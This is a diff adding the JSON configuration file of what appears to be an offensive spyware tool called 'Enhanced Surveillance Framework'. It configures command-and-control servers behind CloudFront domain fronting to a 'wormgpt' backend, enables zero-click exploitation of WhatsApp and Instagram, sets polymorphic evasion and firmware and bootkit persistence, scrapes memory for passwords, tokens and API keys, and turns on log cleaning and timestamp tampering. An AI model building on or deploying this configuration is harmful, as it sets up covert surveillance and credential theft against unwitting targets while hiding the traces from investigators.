@@ -1,0 +1,64 @@
+{
+  "framework": {
+    "name": "Enhanced Surveillance Framework",
+    "version": "5.2.0",
+    "mode": "production",
+    "logging_level": "INFO"
+  },
+  "database": {
+    "type": "sqlite",
+    "path": "data/surveillance.db"
+  },
+  "c2": {
+    "host": "0.0.0.0",
+    "port": 5000,
+    "domain_fronting": {
+      "enabled": true,
+      "cdn_domain": "d111111abcdef8.cloudfront.net",
+      "backend_domain": "api.wormgpt.live"
+    },
+    "redundancy": ["https://c2-server-1.net", "https://c2-server-2.net"]
+  },
+  "exploitation": {
+    "zero_click": {
+      "whatsapp": {
+        "enabled": true,
+        "target_protocol": "TCP",
+        "port": 5222
+      },
+      "instagram": {
+        "enabled": true,
+        "target_protocol": "HTTP",
+        "port": 80
+      }
+    },
+    "cve_repository": "data/cve_db.json",
+    "auto_update": true
+  },
+  "evasion": {
+    "polymorphic": {
+      "junk_code_density": 0.3,
+      "encryption_key": "CHANGE_ME_IN_PRODUCTION"
+    },
+    "domain_fronting": {
+      "enabled": true,
+      "cdn_service": "CloudFront"
+    }
+  },
+  "persistence": {
+    "firmware_level": true,
+    "bootkit": true,
+    "cross_process": true,
+    "daemon": "com.wormgpt.agent"
+  },
+  "data_collection": {
+    "sensor_refresh_rate_ms": 1000,
+    "memory_scraper_patterns": ["password", "token", "api_key"],
+    "screen_capture_quality": 85
+  },
+  "antiforensics": {
+    "timestamp_manipulation": true,
+    "log_cleaning": true,
+    "secure_delete": true
+  }
+}
